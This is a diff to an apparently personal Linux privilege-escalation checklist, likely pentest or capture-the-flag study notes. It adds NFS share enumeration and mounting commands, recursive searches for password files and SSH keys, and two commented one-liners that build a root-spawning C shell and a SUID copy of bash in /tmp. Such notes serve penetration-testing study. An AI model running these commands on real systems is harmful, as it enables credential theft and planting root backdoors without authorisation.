@@ -46,12 +46,17 @@ functions:
         - [ ] process monitoring (below script)
           https://github.com/unkn0wnsyst3m/scripts/blob/master/procmon.sh
 
+        File Systems
+        - [ ] cat /etc/exports
+        - [ ] showmount -e <targetip>  #mount -o rw,vers=2 <targetip>:<mountable-folder> <localmount>
 
         Password Hunting:
         - [ ] grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
         - [ ] locate pass | more
         - [ ] find / -name id_rsa 2>/dev/null
         - [ ] find . -type f -exec grep --color=auto -Hrnwie "PASSWORD" {} 2> /dev/null \;  #search specific folders
+        - [ ] find / -iname *passw* 2>/dev/null
+        - [ ] find / -iname *passw* 2>/dev/null | grep -v -E "/lib/systemd/|boot|/var/lib/dpkg/|/usr/share/|/usr/lib/"
 
         LD_PRELOAD:
         - [ ] sudo -l  #--> is LD_PRELOAD in the sudo permissions?
@@ -141,6 +146,7 @@ resources: |
   https://github.com/SecWiki/linux-kernel-exploits
   https://github.com/lucyoa/kernel-exploits
   https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
-
+  #c-shell: echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > shell.c 
+  #script: cp /bin/bash /tmp/shell && chmod +s /tmp/shell && chmod o+x /tmp/shell
 ---
 
